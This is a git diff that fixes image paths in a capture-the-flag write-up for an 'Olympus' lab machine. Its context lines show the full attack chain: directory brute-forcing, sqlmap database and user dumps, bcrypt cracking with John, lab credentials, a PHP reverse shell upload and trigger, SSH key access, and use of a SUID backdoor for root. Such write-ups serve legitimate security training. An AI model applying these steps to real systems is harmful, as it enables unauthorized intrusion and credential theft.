@@ -49,7 +49,7 @@ Navigating to `http://olympus.thm` showed a page under development with an impor
 
 > *"The old version of the website is still accessible on this domain."*
 
-![Alt Text](/olympus.png) 
+![Alt Text](olympus.png) 
 
 Viewing the page source revealed additional hints:
 - Keywords referencing **AperiSolve** and **Zeecka** (developer handle)
@@ -62,7 +62,7 @@ gobuster dir -u http://olympus.thm \
   -w /usr/share/wordlists/dirb/common.txt 
 ```
 
-![Alt Text](/gobusteronolympus.png) 
+![Alt Text](gobusteronolympus.png) 
 
 **Interesting findings:**
 
@@ -76,7 +76,7 @@ gobuster dir -u http://olympus.thm \
 
 Manually browsing to `/~webmaster/` revealed **Victor CMS** — an old, vulnerable CMS installation.
 
-![Alt Text](/webmaster.png) 
+![Alt Text](webmaster.png) 
 
 ---
 
@@ -101,7 +101,7 @@ Save the POST request to a file (`sql.txt`) using Burp, then run:
 sqlmap -r sql.txt --batch --dbs
 ```
 
-![Alt Text](/sqlmaponolympus.png) 
+![Alt Text](sqlmaponolympus.png) 
 
 **Databases found:**
 
@@ -139,7 +139,7 @@ REDACTED
 sqlmap -r sql.txt --batch -D olympus -T users --dump
 ```
 
-![Alt Text](/sqlmaponolympususers.png) 
+![Alt Text](sqlmaponolympususers.png) 
 
 Three users were found:
 
@@ -178,7 +178,7 @@ sudo nano /etc/hosts
 
 Browsing to `http://chat.olympus.thm` revealed a login portal.
 
-![Alt Text](/chatolmpuysloginpage.png) 
+![Alt Text](chatolmpuysloginpage.png) 
 
 ### Cracking the Password Hash
 
@@ -188,7 +188,7 @@ Save the bcrypt hashes to `hashes.txt` and crack with John:
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![Alt Text](/passwdcrack.png) 
+![Alt Text](passwdcrack.png) 
 
 **Cracked credential:**
 ```
@@ -205,7 +205,7 @@ Login at `http://chat.olympus.thm/login.php` using:
 - **Username:** `prometheus`
 - **Password:** `summertime`
 
-![Alt Text](/chatapp.png) 
+![Alt Text](chatapp.png) 
 
 
 Before locating the uploaded file, a quick directory scan was performed on the chat subdomain:
@@ -219,7 +219,7 @@ This revealed the `/uploads/` directory, indicating where user-uploaded files ar
 However, since filenames are randomized, the exact file name was later confirmed via the database dump.
 
 
-![Alt Text](/gobusteronchat.png) 
+![Alt Text](gobusteronchat.png) 
 
 
 ### Uploading a PHP Reverse Shell
@@ -241,7 +241,7 @@ The server renames uploaded files. The new name was found by querying the databa
 sqlmap -r sql.txt --batch -D olympus -T chats --dump --fresh-queries
 ```
 
-![Alt Text](/sqlfreshdb.png) 
+![Alt Text](sqlfreshdb.png) 
 
 The filename matched a pattern like: `2e449bc3f8b58e9eb3f16c030d45b081.php`
 
@@ -256,7 +256,7 @@ Then navigate to:
 http://chat.olympus.thm/uploads/2e449bc3f8b58e9eb3f16c030d45b081.php
 ```
 
-![Alt Text](/reverseshell.png) 
+![Alt Text](reverseshell.png) 
 
 Shell received as `www-data`.
 
@@ -322,7 +322,7 @@ ssh -i id_rsa zeus@olympus.thm
 # Enter passphrase: snowflake
 ```
 
-![Alt Text](/zeusaccess.png)
+![Alt Text](zeusaccess.png)
 
 ---
 
@@ -347,7 +347,7 @@ Inside it was a PHP backdoor:
 cat /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
 ```
 
-![Alt Text](/htmlfolder.png)
+![Alt Text](htmlfolder.png)
 
 The PHP file referenced a SUID backdoor binary:
 ```php
@@ -360,7 +360,7 @@ $suid_bd = "/lib/defended/libc.so.99";
 /lib/defended/libc.so.99
 ```
 
-![Alt Text](/rootaccess.png)
+![Alt Text](rootaccess.png)
 
 ```
 # id
